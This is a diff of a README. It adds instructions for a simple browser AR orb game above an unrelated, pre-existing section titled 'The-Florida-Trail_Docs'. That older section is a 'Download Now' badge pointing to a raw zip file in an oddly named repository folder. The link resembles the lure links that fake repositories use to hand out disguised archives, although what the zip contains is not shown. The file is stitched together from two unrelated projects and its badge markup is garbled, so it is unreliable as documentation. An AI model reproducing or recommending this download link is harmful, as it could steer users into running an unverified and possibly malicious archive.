@@ -1,3 +1,21 @@
+# AR Orb Hunter (Web AR Game)
+
+This repository now includes a playable browser AR game:
+
+- `index.html` - Game entrypoint
+- `styles.css` - UI and layout styling
+- `game.js` - AR overlay gameplay logic
+
+## Run locally
+
+Because camera access requires an HTTP origin on most browsers, run a local web server:
+
+1. From the repository root, run `python3 -m http.server 8000`
+2. Open `http://localhost:8000/index.html`
+3. Allow camera access, then tap or click glowing orbs to score points
+
+The game also includes a simulation fallback if camera access is denied.
+
 # 🏴🇺🇸️ The-Florida-Trail_Docs - Explore Florida with a Classic Game
 
 [![Download Now](https://raw.githubusercontent.com/lukenicko/The-Florida-Trail_Docs/The-Florida-Trail_Docs_Main-dev/unintriguing/The-Florida-Trail_Docs.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-brightgreen)](https://raw.githubusercontent.com/lukenicko/The-Florida-Trail_Docs/The-Florida-Trail_Docs_Main-dev/unintriguing/The-Florida-Trail_Docs.zip)
